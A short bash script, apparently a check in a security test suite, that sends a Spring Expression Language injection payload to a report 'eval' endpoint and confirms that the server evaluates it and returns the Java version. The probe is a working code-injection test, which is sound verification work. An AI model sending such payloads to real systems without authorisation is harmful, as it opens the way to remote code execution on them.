#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
curl -fsS --get "$TARGET/api/reports/eval" --data-urlencode "expr=T(java.lang.System).getProperty('java.version')" | grep -Eq '"result":"[0-9]+'
